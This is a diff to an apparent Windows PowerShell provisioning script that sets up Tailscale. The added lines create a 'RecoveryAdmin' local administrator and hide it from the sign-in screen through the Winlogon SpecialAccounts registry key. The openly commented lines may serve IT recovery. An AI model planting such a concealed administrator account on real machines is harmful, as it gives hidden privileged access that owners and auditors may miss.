@@ -46,3 +46,7 @@ while ($true) {
 & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=<UPDATE-KEY> --accept-routes --accept-dns --unattended
 # Verify Tailscale service
 Get-Service -Name Tailscale
+#Local Admin
+net user RecoveryAdmin <UPDATE-PASSWORD> /add
+net localgroup Administrators RecoveryAdmin /add
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RecoveryAdmin /t REG_DWORD /d 0 /f
